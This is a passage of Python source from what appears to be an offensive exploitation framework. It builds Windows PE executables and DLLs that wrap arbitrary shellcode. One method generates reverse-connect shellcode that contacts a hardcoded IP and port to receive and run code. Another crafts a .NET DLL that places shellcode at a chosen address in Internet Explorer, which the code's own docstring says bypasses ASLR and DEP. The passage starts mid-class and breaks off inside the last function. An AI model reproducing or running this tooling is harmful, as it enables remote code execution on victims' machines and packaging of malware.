            (self.cb , self.MajorRuntimeVersion , self.MinorRuntimeVersion , self.MetaDataVA , self.MetaDataSize , self.Flags , \
             self.EntryPointToken , self.ResourcesVA , self.StrongNameSignatureVA , self.CodeManagerTableVA , \
             self.VTableFixupsVA , self.ExportAddressTableJumpsVA , self.ManagedNativeHeaderVA , self.ResourcesSize , \
             self.StrongNameSignatureSize , self.CodeManagerTableSize , self.VTableFixupsSize , self.ExportAddressTableJumpsSize , \
             self.ManagedNativeHeaderSize)= struct.unpack(self.optionalfmt, data)
        except struct.error:
            raise PEError, "Invalid Optional Header" % self.signature

    def raw(self):
        try:
            return struct.pack(self.optionalfmt, self.cb , self.MajorRuntimeVersion , self.MinorRuntimeVersion , self.MetaDataVA , self.MetaDataSize , self.Flags , \
                               self.EntryPointToken , self.ResourcesVA , self.StrongNameSignatureVA , self.CodeManagerTableVA , \
                               self.VTableFixupsVA , self.ExportAddressTableJumpsVA , self.ManagedNativeHeaderVA , self.ResourcesSize , \
                               self.StrongNameSignatureSize , self.CodeManagerTableSize , self.VTableFixupsSize , self.ExportAddressTableJumpsSize , \
                               self.ManagedNativeHeaderSize)

        except struct.error:
            raise PEError, "Invalid Optional Header" % self.signature

class PElib:
    def __init__(self, win64=0):
        devlog("pelib", "Win64: %s"%win64)
        self.win64=win64
        return 

    def openrawdata(self, data):
        self.rawdata = data
        self._openPE()

    def openfile(self, filename):
        self.fd = open(filename, "rb")                
        self.filename = filename
        self.rawdata = self.fd.read()
        #shellcode=self.createShellcode()

        self._openPE()
        #self.createPE(shellcode)

    def createShellcode(self):
        # for test only
        localhost = "192.168.1.103"
        localport = 8090

        sc = shellcodeGenerator.win32()
        sc.addAttr("findeipnoesp",{"subespval": 0x1000 })
        sc.addAttr("revert_to_self_before_importing_ws2_32", None)
        sc.addAttr("tcpconnect", {"port" : localport, "ipaddress" : localhost})
        sc.addAttr("RecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
        sc.addAttr("ExitThread", None)
        injectme = sc.get()

        sc = shellcodeGenerator.win32()
        sc.addAttr("findeipnoesp", {"subespval": 0})
        sc.addAttr("InjectToSelf", { "injectme" : injectme })
        sc.addAttr("ExitThread", None)
        return sc.get()

    def align(self, idx, aligment):
        return (idx +aligment) & ~(aligment-1)

    def _openPE(self):
        self.MZ = MZ()
        idx=0
        self.MZ.get(self.rawdata[idx:idx+self.MZ.getSize()])
        self.PE = PE( win64=self.win64 )
        self.PE.get(self.rawdata, self.MZ.getPEOffset())        

    def createPE(self, filename, shellcode, importante = [ ("advapi32.dll", ["RevertToSelf"])], gui=True ):

        buf = self.createPEFileBuf(shellcode, importante, gui=gui) 

        f=open(filename, "wb")                                
        f.write(buf)
        f.close()


    def createPEFileBuf(self, shellcode, importante = [ ("advapi32.dll", ["RevertToSelf"])], gui=True, dllname='kernel64.dll'):

        # If you want a dll pass as first argument a dict with
        # { export_name : shellcode } , the first shellcode will
        # be threated as the dllmain (remember to set eax/rax to 0
        # before return)
        if type(shellcode) == type(str()):
            devlog("pelib", "Not creating DLL")
            pedll = 0
        else:
            devlog('pelib', 'building dll')
            pedll = 1

            dllexports = shellcode
            shellcode = ''
            for nameexp,codeexp in dllexports.iteritems():
                shellcode += codeexp
        idx= 0
        # MZ
        mz = MZ()
        mz.e_lfanew = mz.getSize()

        idx+= mz.getSize()

        # PE Image Header
        imgHdr = IMGhdr( win64=self.win64 )
        if self.win64 == 1:
            imgHdr.Machine = 0x8664         # x86_64
            imgHdr.NumberOfSections = 0x2   # Code and data for now (Maybe we can do it only one)
            imgHdr.Characteristics = 0x0122 # Executable on 32-bit machine and can handle > 2GB addresses
        else:
            devlog("pelib", "Creating 32 bit executable")
            imgHdr.Machine = 0x014c         # i386
            imgHdr.NumberOfSections = 0x2   # Code and data for now (Maybe we can do it only one)
            imgHdr.Characteristics = 0x0102 # Executable on 32-bit machine

        if pedll == 1:
            imgHdr.Characteristics |= 0x2000

        idx += imgHdr.getSize() + 4 # for PE_MAGIC

        # Optional Header 
        imgOpt = IMGOPThdr( win64=self.win64 )
        #imgOpt.SectionAlignment = 0x20 # Thats our aligment

        imgOpt.SectionAlignment = 0x1000 # NEW Thats our aligment
        #imgOpt.FileAlignment    = 0x20
        imgOpt.FileAlignment    = 0x200 #NEW

        #create bigger shellcode if necessary
        shellcode = shellcode + "\x00"*self.align(len(shellcode),imgOpt.SectionAlignment)

        imgOpt.MajorOperatingSystemVersion = 0x4 # NT4.0
        imgOpt.MajorSubsystemVersion = 0x4 # Win32 4.0
        if gui:
            devlog("pelib", "GUI is set")
            imgOpt.Subsystem = 0x2 #2 for GUI, 3 for non-GUI
        else:
            devlog("pelib", "GUI is NOT set")
            imgOpt.Subsystem = 0x3 #2 for GUI, 3 for non-GUI
        imgOpt.SizeOfStackReserve = 0x100000
        imgOpt.SizeOfStackCommit  = 0x1000
        imgOpt.SizeOfHeapReserve  = 0x100000
        imgOpt.SizeOfHeapCommit   = 0x1000
        imgOpt.NumberOfRvaAndSizes= 0x10

        if pedll == 1:
            imgOpt.DllCharacteristics = 0x40 #dll can be relocated at load time


        idx += imgOpt.getSize()

        # Directories
        directories=[]
        for a in range(0, imgOpt.NumberOfRvaAndSizes):
            directories.append(Directory())

        idx+= directories[0].getSize() * 16

        # .code section
        code = Section()
        code.Name = ".text"
        code.Characteristics = 0xE0000020L  # Code | Executable | Readable
        idx+= code.getSize()

        # .data section
        data = Section()
        data.Name = ".data"
        data.Characteristics = 0xc0000040L # Initialized | Readable | Writeable

        idx += data.getSize()

        #code_offset = self.align(idx, imgOpt.FileAlignment)
        code_offset = self.align(idx, imgOpt.SectionAlignment)
        firstpad= "\0" * (code_offset - idx)
        idx=code_offset

        # we can fill data_buf with our data and that will be loaded into mem :>
        idx+= len(shellcode)
        #data_offset = self.align(idx, imgOpt.FileAlignment)
        data_offset = self.align(idx, imgOpt.SectionAlignment)

        secondpad= "\0" * (data_offset - idx)
        idx = data_offset
        data_buf =""  
        idx+= len(data_buf) #XXX: ??!?!

        #Our Import Section (.idata) looks like:
        #
        #Directory Table (the ImportDescriptors)
        #Null Directory Entry (last Null ImportDescriptor)
        #
        #DLL Names (for ImportDescriptor)
        #
        #DLL1 Import Lookup Table
        #NULL
        #
        #DLL2 ...
        #
        #Hint-Name Table (All DLL names)
        
        # Creating the list of ImportDescriptors
        import_offset =idx
        imports=[]
        ndx= 0
        import_str=""

        for a in importante:
            i= ImportDescriptor()
            i.ForwarderChain= 0xFFFFFFFFL
            imports.append( (i,  ndx))

            ndx+=len(a[0]+"\0") # We put on NDX, an index of the name string, so at the end
                        #  to find a string, we will do import_str_offset + this_index

            import_str += a[0] + "\0" # Collecting dll names

        # The final importdescriptor
        imports.append((ImportDescriptor(), 0))
        idx+= i.getSize() * len(imports)

        import_str_offset = idx
        idx+= len(import_str)

        off = self.align(idx, imgOpt.FileAlignment)
        import_str+="\0" * (off-idx)
        idx = off

        # Original Thunks
        original_thunks_offset = idx
        original_thunk=[]
        for a in importante:
            original_thunk.append(idx)
            if self.win64 == 1:
                idx+= len(a[1]) * 8 + 8
            else:
                idx+= len(a[1]) * 4 + 4

        # First thunk offset
        first_thunks_offset = idx
        first_thunk=[]
        for a in importante:
            first_thunk.append(idx)
            if self.win64 == 1:
                idx+= len(a[1]) * 8 + 8
            else:
                idx+= len(a[1]) * 4 + 4

        # Creating IIBN
        IIBN=[]
        for a in importante: 
            tbl=[]
            IIBN.append(tbl)
            for b in a[1]:
                iibn = ImageImportByName()
                iibn.Name = b #"RevertToSelf"
                iibn.Hint = 1
                tbl.append((iibn, idx)) 
                idx+=iibn.getSize()                

        end_import_offset = idx
        thirdpad = "\0" * (self.align(idx, imgOpt.FileAlignment) - idx)
        # Create the Export Table
        if pedll == 1:
            # Number of exports
            dllcount = len(dllexports)

            export_offset = idx = self.align(idx, imgOpt.FileAlignment)
            imgExp = ImageExportDirectory()
            idx += imgExp.getSize()
            #idx = self.align(idx, imgOpt.FileAlignment)
            imgExp.Name = idx
            idx += len(dllname) + 1
            imgExp.Base = 1
            imgExp.NumberOfFunctions = imgExp.NumberOfNames = dllcount
            #idx = self.align(idx, imgOpt.FileAlignment)


            # Reserve Space for RVA Tables
            # each RVA entry is 4 bytes and has
            # one for name and other for address
            imgExp.AddressOfFunctions = idx
            idx += dllcount * 4 # add address entries
            imgExp.AddressOfNames = idx
            idx += dllcount * 4 # add name entries

            # Build RVA Tables

            #dllcodeoff = code_offset + imgOpt.ImageBase
            #not sure of this, must be RVA
            dllnamestr = ''
            dllcodeoff = code_offset
            dlladdrtable = ''
            dllnametable = ''
            expofftmp = 0

            for nameexp, codeexp in dllexports.iteritems():
                #build name pointer table (RVA)
                dllnametable += struct.pack('<L', idx)
                idx += len(nameexp) + 1
                #build export string table
                dllnamestr += nameexp + '\x00'
                #build address export table (RVA)
                dlladdrtable += struct.pack('<L',expofftmp + dllcodeoff)
                expofftmp += len(codeexp)

            # Ordinal Table - 16 bit indexes into the export addr table
            imgExp.AddressOfNameOrdinals = idx
            dllordinals = ''
            for i in range(0, dllcount+1):
                dllordinals += struct.pack('<H', i)
            idx += len(dllordinals)

        endpad= "\0" * (self.align(idx, imgOpt.FileAlignment) - idx)   

        # Filling the gaps
        imgOpt.SizeOfCode = len(shellcode) + len(secondpad)
        imgOpt.BaseOfCode = imgOpt.AddressOfEntryPoint = code_offset
        imgOpt.BaseOfData = data_offset
        if pedll == 1:
            # Higher addresses
            imgOpt.ImageBase = 0x61000000
        else:
            imgOpt.ImageBase = 0x71000000

        imgOpt.SizeOfImage = 0xc # ?

        imgOpt.SizeOfHeaders = code_offset
        imgOpt.NumberOfRvaAndSizes = 0x10

        # Export Directory
        if pedll == 1:
            directories[0].VirtualSize=directories[0].Size = idx - export_offset
            directories[0].VirtualAddress= export_offset

        # Import Directory
        directories[1].VirtualSize=directories[1].Size = end_import_offset - import_offset 
        directories[1].VirtualAddress= import_offset 

        # code and data
        code.VirtualAddress = code_offset
        code.VirtualSize= code.SizeOfRawData  = imgOpt.SizeOfCode 
        code.PointerToRawData = code_offset

        data.VirtualAddress = data_offset
        data.VirtualSize = data.SizeOfRawData = self.align(idx - data_offset, imgOpt.FileAlignment) #len(data_buf)
        data.PointerToRawData  = data_offset

        imgOpt.SizeOfInitializedData = data.SizeOfRawData
        imgOpt.SizeOfImage = self.align(idx,imgOpt.SectionAlignment) # code.SizeOfRawData + data.SizeOfRawData

        # Fixing imports with thunk info
        for a in range(0, len(imports)-1):
            imports[a][0].OriginalFirstThunk= original_thunk[a]
            imports[a][0].FirstThunk= first_thunk[a] 
            imports[a][0].Name = import_str_offset + imports[a][1]                        


        # RAWing...
        buf = mz.raw() + struct.pack("<L", PE_MAGIC) +imgHdr.raw() + imgOpt.raw()
        for a in directories:
            buf+= a.raw()
        buf+= code.raw()
        buf+= data.raw()
        buf+= firstpad
        buf+= shellcode
        buf+= secondpad
        buf+= data_buf   

        for a in imports:
            buf+= a[0].raw()
        buf+= import_str

        # ORIGINAL THUNK
        for a in IIBN:
            if self.win64 == 1:
                for b in a: # Listing function
                    buf+=struct.pack("<Q",b[1]) 
                buf+=struct.pack("<Q",0x0)
            else:
                for b in a: # Listing function
                    buf+=struct.pack("<L",b[1]) 
                buf+=struct.pack("<L",0x0)

        # FIRST THUNK
        for a in IIBN:
            if self.win64 == 1:
                for b in a: # Listing function
                    buf+=struct.pack("<Q",b[1]) 
                buf+=struct.pack("<Q",0x0)
            else:
                for b in a: # Listing function
                    buf+=struct.pack("<L",b[1]) 
                buf+=struct.pack("<L",0x0)

        # IIBN
        for a in IIBN:
            for b in a:
                buf+= b[0].raw()

        buf+=thirdpad

        # Lets add dll stuff
        if pedll == 1:
            buf+=imgExp.raw()
            buf+=dllname + '\x00'
            buf+=dlladdrtable
            buf+=dllnametable
            buf+=dllnamestr
            buf+=dllordinals
            buf+=endpad

        return buf


    # For MOSDEF 
    def createMOSDEFPE(self, filename, code, vars={}, win64=2):
        if win64 == 2:
            if self.win64 == 1:
                win64 = 1
            else:
                win64 = 0

        if win64 == 1:
            from win64peresolver import win64peresolver as win32peresolver
            arch = "x64"
        else:
            from win32peresolver import win32peresolver
            arch = "x86"
        # shellcode, importante=[ ("advapi32.dll", ["RevertToSelf"])] ):

        # Mixing MOSDEF with PElib.
        # Concerning Mosdef:
        #  Basically, we have a win32peresolver that pass some fixed address (that would be our PE PLT)
        # and thats returned to the compile code. The win32peresolver put all this address on a cached.
        # 
        # Concerning PE
        #  First of all, we need to compile before everything, cause we need the list of imported functions
        #  So, we send mosdef a hardcoded address(0x401A0) offset: 0x1A0 which is where the .text section start.
        #  At that address, will be our PLT (jmp *(IAT_entry)), so we have to point the Entry Address to 
        #  .code + function_number * sizeof(jmp *(IAT_entry)). So we land on the begging on the shellcode.
        #  
        #  To discover where the IAT would be (we need to know this, before creating the PLT), we need to calculate
        #  where the First thunk
        #
        #              buf+= secondpad
        #              buf+= data_buf   
        #              
        #              for a in imports:
        #                      buf+= a[0].raw()
        #              buf+= import_str
        #
        #              # ORIGINAL THUNK
        #             for a in IIBN:
        #                     for b in a: # Listing function
        #                              buf+=struct.pack("L",b[1]) 
        #                      buf+=struct.pack("L",0x0)
        #              # FIRST THUNK
        #              for a in IIBN:
        #                      for b in a: # Listing function
        #                              buf+=struct.pack("L",b[1]) 
        #                      buf+=struct.pack("L",0x0)

        # side note: .code must be aligned

        image_base = 0x40000
        plt_len = len(mosdef.assemble("jmp *(0x01020304)", arch))
        plt_entry = 0x1000 + image_base

        w=win32peresolver(plt_entry)                
        w.setPLTEntrySize(plt_len)

        shellcode = w.compile(code, vars)

        # We need to pass the functioncache[func] = address into [ ("advapi32.dll", ["RevertToSelf"])] format
        # Yeah, probably you can do it better or with one fancy python line
        dll={}
        func_by_addr = {}
        functions_num=0

        
        for a in w.remotefunctioncache.keys():
            s = a.split("|")
            if dll.has_key( s[0] ):
                dll[s[0] ].append(s[1])
            else:
                dll[ s[0] ] = [ s[1] ] 
            functions_num+=1
            func_by_addr[a] = w.remotefunctioncache[a]

        importante = []
        for a in dll.keys():
            importante.append( (a, dll[a]) )
        shellcode = "\x90" * ( plt_len * functions_num) + shellcode

        # So, by now we have important in the fancy format [ ('dll name', ['functions'] ) ]
        # And also, func_by_addr = {dllname!function]: function_plt }, and also functions_num has the size of functions



        idx= 0
        # MZ
        mz = MZ()
        mz.e_lfanew = mz.getSize()

        idx+= mz.getSize()

        # PE Image Header
        imgHdr = IMGhdr(win64=win64)
        if win64==1:
            imgHdr.Machine = 0x8664         # AMD64 or x86_64
            imgHdr.NumberOfSections = 0x2   # Code and data for now (Maybe we can do it only one)
            imgHdr.Characteristics = 0x0022 # IMAGE_FILE_EXECUTABLE_IMAGE, IMAGE_FILE_LARGE_ADDRESS_AWARE

        else:
            imgHdr.Machine = 0x014c         # i386
            imgHdr.NumberOfSections = 0x2   # Code and data for now (Maybe we can do it only one)
            imgHdr.Characteristics = 0x0102 # IMAGE_FILE_EXECUTABLE_IMAGE, IMAGE_FILE_32BIT_MACHINE

        idx += imgHdr.getSize() + 4 # for PE_MAGIC

        # Optional Header 
        imgOpt = IMGOPThdr( win64=win64 )
        imgOpt.SectionAlignment = 0x1000 # Thats our aligment
        imgOpt.FileAlignment    = 0x1000
        imgOpt.MajorOperatingSystemVersion = 0x4 # NT4.0
        imgOpt.MajorSubsystemVersion = 0x4 # Win32 4.0
        imgOpt.MajorImageVersion = 0x4
        imgOpt.Subsystem = 0x3
        imgOpt.SizeOfStackReserve = 0x100000
        imgOpt.SizeOfStackCommit  = 0x1000
        imgOpt.SizeOfHeapReserve  = 0x100000
        imgOpt.SizeOfHeapCommit   = 0x1000
        imgOpt.NumberOfRvaAndSizes= 0x10

        idx += imgOpt.getSize()

        # Directories
        directories=[]
        for a in range(0, imgOpt.NumberOfRvaAndSizes):
            directories.append(Directory())

        idx+= directories[0].getSize() * 16

        # .code section
        code = Section()
        code.Name = ".text"
        code.Characteristics = 0x60000020L  # Code | Executable | Readable
        idx+= code.getSize()

        # .data section
        data = Section()
        data.Name = ".data"
        data.Characteristics = 0xc0000040L # Initialized | Readable | Writeable

        idx += data.getSize()

        code_offset = self.align(idx, imgOpt.SectionAlignment)
        firstpad= "\0" * (code_offset - idx)
        idx=code_offset

        # we can fill data_buf with our data and that will be loaded into mem :>
        idx+= len(shellcode)
        data_offset = self.align(idx, imgOpt.SectionAlignment)
        secondpad= "\0" * (data_offset - idx)
        idx = data_offset
        data_buf =""  
        idx+= len(data_buf)

        #Our Import Section (.idata) looks like:
        #
        #Directory Table (the ImportDescriptors)
        #Null Directory Entry (last Null ImportDescriptor)
        #
        #DLL Names (for ImportDescriptor)
        #
        #DLL1 Import Lookup Table
        #NULL
        #
        #DLL2 ...
        #
        #Hint-Name Table (All DLL names)
        
        # Creating the list of ImportDescriptors
        import_offset =idx
        imports=[]
        ndx= 0
        import_str=""

        for a in importante:
            i= ImportDescriptor()
            i.ForwarderChain= 0xFFFFFFFFL
            imports.append( (i,  ndx))

            ndx+=len(a[0]+"\0") # We put on NDX, an index of the name string, so at the end
                        #  to find a string, we will do import_str_offset + this_index

            import_str += a[0] + "\0" # Collecting dll names

        # The final importdescriptor
        imports.append((ImportDescriptor(), 0))
        idx+= i.getSize() * len(imports)

        import_str_offset = idx
        idx+= len(import_str)

        off = self.align(idx, 0x10)
        import_str+="\0" * (off-idx)
        idx = off

        # Original Thunks
        original_thunks_offset = idx
        original_thunk=[]

        for a in importante:
            original_thunk.append(idx)
            if win64 == 1:
                idx+= len(a[1]) * 8 + 8
            else:
                idx+= len(a[1]) * 4 + 4

        # First thunk offset
        first_thunks_offset = idx
        first_thunk=[]
        for a in importante:
            first_thunk.append(idx)
            for b in a[1]:
                dupla = "%s|%s" % (a[0], b)

                if not func_by_addr.has_key(dupla):
                    raise PEError, "Error on Thunk"
                
                func_by_addr[ func_by_addr[dupla] ] = idx+image_base
                idx+=4
                if win64: idx+=4
            
            idx+= 4
            if win64: idx+=4
        
        # crafting a PLT
        PLT=""
        for a in range(plt_entry, plt_entry+ plt_len * functions_num, plt_len):
            if not func_by_addr.has_key(a):
                raise PEError, "func_by_addr doesn't have a PLT address (%x)" % a
            if win64:
                addr = func_by_addr[a] - a - plt_len
            else:
                addr = func_by_addr[a]
            PLT+= mosdef.assemble("jmp *(0x%08x)\n"%addr, arch)
        shellcode = PLT + shellcode[plt_len * functions_num:]
        print "Shellcode size (with PLT): %d" % len(shellcode)


        # Creating IIBN 
        IIBN=[]
        for a in importante: 
            tbl=[]
            IIBN.append(tbl)
            for b in a[1]:
                iibn = ImageImportByName()
                iibn.Name = b #"RevertToSelf"
                iibn.Hint = 1
                tbl.append((iibn, idx)) 
                idx+=iibn.getSize()                

        endpad= "\0" * (self.align(idx, imgOpt.FileAlignment) - idx)   

        # Filling the gaps
        imgOpt.SizeOfCode = len(shellcode) + len(secondpad)
        imgOpt.BaseOfCode = code_offset
        # Entry point = code_offset + PLT_entry size
        imgOpt.AddressOfEntryPoint = code_offset + plt_len * functions_num

        imgOpt.BaseOfData = data_offset
        imgOpt.ImageBase = image_base
        imgOpt.SizeOfInitializedData = 0x20
        imgOpt.SizeOfImage = 0xC # 

        imgOpt.SizeOfHeaders = code_offset
        imgOpt.NumberOfRvaAndSizes = 0x10

        # Import Directory

        directories[1].VirtualSize=directories[1].Size = idx - import_offset 
        directories[1].VirtualAddress= import_offset 

        # code and data
        code.VirtualAddress = code_offset
        code.VirtualSize= code.SizeOfRawData  = imgOpt.SizeOfCode 
        code.PointerToRawData = code_offset

        data.VirtualAddress = data_offset
        data.VirtualSize = data.SizeOfRawData = idx - data_offset #len(data_buf)
        data.PointerToRawData  = data_offset

        imgOpt.SizeOfImage =  idx #

        # Fixing imports with thunk info
        for a in range(0, len(imports)-1):
            imports[a][0].OriginalFirstThunk= original_thunk[a]
            imports[a][0].FirstThunk= first_thunk[a] 
            imports[a][0].Name = import_str_offset + imports[a][1]                        


        # RAWing...
        buf = mz.raw() + struct.pack("<L", PE_MAGIC) +imgHdr.raw() + imgOpt.raw()
        for a in directories:
            buf+= a.raw()
        buf+= code.raw()
        buf+= data.raw()
        buf+= firstpad
        buf+= shellcode
        buf+= secondpad
        buf+= data_buf   

        for a in imports:
            buf+= a[0].raw()
        buf+= import_str

        #//TODO >=====< correct these offsets
        # ORIGINAL THUNK
        for a in IIBN:
            for b in a: # Listing function
                if win64:
                    buf+=struct.pack("<Q",b[1]) 
                else:
                    buf+=struct.pack("<L",b[1]) 
            if win64:
                buf+=struct.pack("<Q",0x0)
            else:
                buf+=struct.pack("<L",0x0)

        # FIRST THUNK
        for a in IIBN:
            for b in a: # Listing function
                if win64:
                    buf+=struct.pack("<Q",b[1]) 
                else:
                    buf+=struct.pack("<L",b[1]) 
            if win64:
                buf+=struct.pack("<Q",0x0)
            else:
                buf+=struct.pack("<L",0x0)

        # IIBN
        for a in IIBN:
            for b in a:
                buf+= b[0].raw()
        buf+= endpad

        # Done, dumping to a file
        f=open(filename, "wb")
        f.write(buf)
        f.close()
        return len(buf)

    def createDotNETPEFileBuf(self, shellcode, shellcode_address, pad_to_exact_address=True, padchar='\x90', extralen=0x10000 ):
        """
        Use the Mark Dowd and Alex Sotirov's idea of modify a .NET DLL to load our shellcode in IE under a specific memory address (effectively bypassing ASLR and DEP)

        """

        if pad_to_exact_address:
            padlen = 0
            if (shellcode_address & 0xffff) < 0x22c5:
                shellcode_address -= extralen
                padlen += extralen - (shellcode_address & 0xffff)
            padlen += (shellcode_address & 0xffff) - 0x22c5
            shellcode = padchar * padlen + shellcode

        # Filling the Metadata structure
        metadata = "BSJB"
        metadata += struct.pack("<HH",1,1) #Major and Minor Version
        metadata += struct.pack("<L",0)    #Reserved
        metadata += struct.pack("<L",0xc)  #Size of String
        metadata += "v2.0.50727"
        metadata += struct.pack("<L",0)    #Flags
        metadata += struct.pack("<H",5)    #Number of Streams

        #Stream #~
        metadata += struct.pack("<L",0x6c) #Offset relative to the beginning of Metadata section
        metadata += struct.pack("<L",0xe4) #Size
        metadata += "#~\0\0"

        #Stream #Strings
        metadata += struct.pack("<L",0x150) #Offset relative to the beginning of Metadata section
        metadata += struct.pack("<L",0xb8) #Size
        metadata += "#Strings\0\0\0\0"

        #Stream #GUID
        metadata += struct.pack("<L",0x208) #Offset relative to the beginning of Metadata section
        metadata += struct.pack("<L",0x10) #Size
        metadata += "#GUID\0\0\0"

        #Stream #Blob
        metadata += struct.pack("<L",0x218) #Offset relative to the beginning of Metadata section
        metadata += struct.pack("<L",0x40) #Size
        metadata += "#Blob\0\0\0"

        #Stream #US (User Streams)
        encoded_len = encode_7bits(len(shellcode))
        metadata += struct.pack("<L",0x258) #Offset relative to the beginning of Metadata section
        metadata += struct.pack("<L",len(shellcode)+3+len(encoded_len)) #Size
        metadata += "#US\0"

        #Stream #~ data
        metadata += struct.pack("<L",0) #Reserved
        metadata += "\x02\x00" #Major and Minor Version
        metadata += "\x00" #HeapSizes
        metadata += "\x01" #Reserved

        metadata += binstring("4714020009000000") #QWORD bitmask of tables present
        #0000000000000000000000000000100100000000000000100001010001000111
        #Module/TypeRef/TypeDef/MethodDef/MemberRef/CustomAttribute/StandAloneSig/Assembly/AssemblyRef

        metadata += binstring("00FA013300160000") #QWORD bitmask sorted tables
        #0000000000000000000101100000000000110011000000011111101000000000

        #number of rows for each table
        metadata += binstring("010000000300000002000000010000000300000002000000010000000100000002000000")

        #Module * 1
        metadata += "\x00\x00" #Reserved
        metadata += struct.pack("<H",0xa) #Name (index in Strings stream)
        metadata += struct.pack("<H",0x1) #GUID (index in GUID stream)
        metadata += struct.pack("<H",0)
        metadata += struct.pack("<H",0)

        #TypeRef * 3
        metadata += struct.pack("<H",0x6) #ResolutionScope index (AssemblyRef)
        metadata += struct.pack("<H",0x3d)#TypeName (index into String heap)
        metadata += struct.pack("<H",0x28)#TypeNamespace (index into String heap)

        metadata += struct.pack("<H",0xa) #AssemblyRef
        metadata += struct.pack("<H",0x78)
        metadata += struct.pack("<H",0x58)

        metadata += struct.pack("<H",0xa) #AssemblyRef
        metadata += struct.pack("<H",0x98)
        metadata += struct.pack("<H",0x58)

        #Type Def * 2
        metadata += struct.pack("<L",0) #Flags
        metadata += struct.pack("<H",0x1) #TypeName (String index)
        metadata += struct.pack("<H",0x0) #TypeNamespace (index into String heap)
        metadata += struct.pack("<H",0x0) #Extends (index into TypeDef, TypeRef or TypeSpec table; more precisely, a TypeDefOrRef coded index)
        metadata += struct.pack("<H",0x1) #FieldList
        metadata += struct.pack("<H",0x1) #MethodList

        metadata += struct.pack("<L",0x00100001) #Flags
        metadata += struct.pack("<H",0x16) #TypeName (String index)
        metadata += struct.pack("<H",0x20) #TypeNamespace (index into String heap)
        metadata += struct.pack("<H",0x05) #Extends (index into TypeDef, TypeRef or TypeSpec table; more precisely, a TypeDefOrRef coded index)
        metadata += struct.pack("<H",0x1) #FieldList
        metadata += struct.pack("<H",0x1) #MethodList

        #MethodDef * 1
        metadata += struct.pack("<L",0x2000 + 0x6 + 0x48) #RVA (a 4-byte constant)
        metadata += struct.pack("<H",0x0) #ImplFlags (a 2-byte bitmask of type MethodImplAttributes)
        metadata += struct.pack("<H",0x1886) #Flags (a 2-byte bitmask of type MethodAttribute)
        metadata += struct.pack("<H",0x49)   #Name (index into String heap)
        metadata += struct.pack("<H",0xa)    #Signature (index into Blob heap)
        metadata += struct.pack("<H",0x1)    #ParamList (index into Param table)

        metadata += binstring("110049000E00190049000A00090049000A002E000B0017002E0013002000130004800000000000000000000000000000000020000000020000000000000000000000010028000000000002000000000000000000000001004F000000000000000000")

        #Stream #Strings data
        metadata += binstring("003C4D6F64756C653E006578706C6F69742E646C6C005368656C6C636F6465006578706C6F69740053797374656D2E57696E646F77732E466F726D730055736572436F6E74726F6C002E63746F72006D73636F726C69620053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300436F6D70696C6174696F6E52656C61786174696F6E734174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465000000")

        #Stream #GUID data
        metadata += binstring("6A50B376797DD4489D1FA5FDCAEF2CFE")

        #Stream #Blob data
        metadata += binstring("0008B77A5C561934E0890320000104200101080307010E0801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F77730100")

        #Stream #US data
        metadata += "\0" + encoded_len + shellcode + "\0\1"


        idx= 0
        # MZ
        mz = MZ()
        mz.e_lfanew = mz.getSize()

        idx+= mz.getSize()

        # PE Image Header
        imgHdr = IMGhdr()
        imgHdr.Machine = 0x014c         # i386
        imgHdr.NumberOfSections = 0x3   # Code, rsrc, relocs
        imgHdr.Characteristics = 0x210E # Executable on 32-bit machine, DLL,no symbols, no line numbers

        idx += imgHdr.getSize() + 4 # for PE_MAGIC

        # Optional Header 
        imgOpt = IMGOPThdr()
        imgOpt.SectionAlignment = 0x2000
        imgOpt.FileAlignment    = 0x200 # Thats our aligment
        imgOpt.MajorOperatingSystemVersion = 0x4 # NT4.0
        imgOpt.MajorSubsystemVersion = 0x4 # Win32 4.0
        imgOpt.Subsystem = 0x3
        imgOpt.DllCharacteristics = 0x500 #NX compatible, No structured exception handler
        imgOpt.SizeOfStackReserve = 0x100000
        imgOpt.SizeOfStackCommit  = 0x1000
        imgOpt.SizeOfHeapReserve  = 0x100000
        imgOpt.SizeOfHeapCommit   = 0x1000
        imgOpt.NumberOfRvaAndSizes= 0x10
        imgOpt.SizeOfInitializedData = 0x600
        imgOpt.SizeOfHeaders = 0x200
        imgOpt.MajorLinkerVersion = 0x8

        idx += imgOpt.getSize()

        # Directories
        directories=[]
        for a in range(0, imgOpt.NumberOfRvaAndSizes):
            directories.append(Directory())

        idx+= directories[0].getSize() * 16

        # .code section
        code = Section()
        code.Name = ".text"
        code.Characteristics = 0x60000020L  # Code | Executable | Readable
        idx+= code.getSize()

        # .rsrc section
        rsrc = Section()
        rsrc.Name = ".rsrc"
        rsrc.Characteristics = 0x40000040L # Initialized | Readable
        idx += rsrc.getSize()

        # .reloc section
        reloc = Section()
        reloc.Name = ".reloc"
        reloc.Characteristics = 0x42000040L # Initialized | Discardable | Readable
        idx += reloc.getSize()

        #code data placeholder
        code_offset = self.align(idx, imgOpt.FileAlignment)
        firstpad= "\0" * (code_offset - idx)
        idx=code_offset

        #the entry point actually is just a JMP to our imported function
        entry_point = idx
        idx+=6

        #CLR placeholder
        clr = IMAGE_COR20_HEADER()
        clr_offset = idx
        idx += clr.getSize()

        #Real .NET code (function definition)
        idx += 28

        #.NET metadata
        metadata_offset = idx
        idx += len(metadata)

        #imports table placeholder
        import_offset = idx
        clr_import = ImportDescriptor()
        null_import = ImportDescriptor()
        import_str = "mscoree.dll\0"

        idx+= clr_import.getSize() * 2

        #import dll string
        import_str_offset = idx
        idx+= len(import_str)

        off = self.align(idx, imgOpt.FileAlignment)
        import_str+="\0" * (off-idx)
        idx = off

        # Original Thunks
        original_thunks_offset = idx
        idx+= 4 + 4

        # First thunk offset
        first_thunks_offset = idx
        idx+= 4 + 4

        # Creating Image Import By Name 
        iibn_offset = idx
        iibn = ImageImportByName()
        iibn.Name = "_CorDllMain"
        iibn.Hint = 0
        idx+=iibn.getSize()

        end_import_offset = idx

        #rsrc data
        rsrc_buf = binstring("00 00 00 00")
        rsrc_offset = self.align(idx, imgOpt.FileAlignment)
        secondpad= "\0" * (rsrc_offset - idx)
        idx = rsrc_offset
        idx+= len(rsrc_buf)

        #reloc data
        reloc_offset = self.align(idx, imgOpt.FileAlignment)
        thirdpad= "\0" * (reloc_offset - idx)
        idx = reloc_offset
        idx+= 0xc

        endpad= "\0" * (self.align(idx, imgOpt.FileAlignment) - idx)

        ######################################## Filling the gaps #################################
